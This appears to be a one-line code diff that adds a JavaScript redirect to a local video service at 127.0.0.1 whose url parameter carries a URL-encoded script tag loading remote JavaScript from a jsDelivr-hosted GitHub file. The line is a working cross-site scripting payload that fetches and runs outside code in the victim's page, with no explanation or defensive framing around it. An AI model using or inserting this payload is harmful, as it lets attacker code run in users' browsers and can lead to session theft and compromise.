@@ -1,0 +1,1 @@
+window.location.href = `http://127.0.0.1:80/video?url=<script+src%3D"https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FEmyr298%2Fcollegsus%40master%2Ftest15.js"><%2Fscript>&format=mp4`;
